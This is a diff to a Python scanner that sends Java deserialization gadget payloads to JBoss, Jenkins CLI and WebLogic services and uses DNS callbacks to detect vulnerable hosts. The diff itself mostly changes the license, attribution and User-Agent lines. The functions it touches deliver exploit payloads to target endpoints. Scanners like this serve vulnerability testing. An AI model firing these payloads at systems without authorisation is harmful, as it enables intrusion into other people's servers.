@@ -9,7 +9,8 @@ import random
 import socket
 import base64
 
-__author__ = "Philippe Arteau (GoSecure)"
+__author__  = "Philippe Arteau (GoSecure)"
+__license__ = "MIT" #See LICENSE file
 
 def main(script,argv):
     """
@@ -73,13 +74,12 @@ def buildDnsGadgetCC1(dns_host):
 
 def send_payload_jboss(host,port,dns_suffix):
     """
-    Taken from: http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
+    Inspired from: http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
     """
-    session = requests.Session()
 
     rawBody = buildDnsGadgetCC1(hexlify(str(random.randint(10, 999))+":jboss:"+host+":"+port)+"."+dns_suffix)
-    headers = {"User-Agent":"YSoSerialScanner","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1"}
-    response = session.post("http://"+host+":"+port+"/invoker/JMXInvokerServlet", data=rawBody, headers=headers)
+    headers = {"User-Agent":"BreakFastSerial"}
+    response = requests.post("http://"+host+":"+port+"/invoker/JMXInvokerServlet", data=rawBody, headers=headers)
 
     if(response.status_code == 200):
         print(" [+] JBoss payload sent with success")
@@ -90,10 +90,12 @@ def send_payload_jboss(host,port,dns_suffix):
 def send_payload_jenkins_cli(host,port,dns_suffix):
     """
     Original exploit : https://github.com/breenmachine/JavaUnserializeExploits/blob/master/jenkins.py
+    See the original repository for license
     """
 
     #Query Jenkins over HTTP to find what port the CLI listener is on
-    r = requests.get('http://'+host+':'+port)
+    headers = {"User-Agent":"BreakFastSerial"}
+    r = requests.get('http://'+host+':'+port,headers)
     try:
         cli_port = int(r.headers['X-Jenkins-CLI-Port'])
     except KeyError:
@@ -128,6 +130,7 @@ def send_payload_jenkins_cli(host,port,dns_suffix):
 def send_payload_weblogic(host,port,dns_suffix):
     """
     Original exploit : https://github.com/breenmachine/JavaUnserializeExploits/blob/master/weblogic.py
+    See the original repository for license
     """
     
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
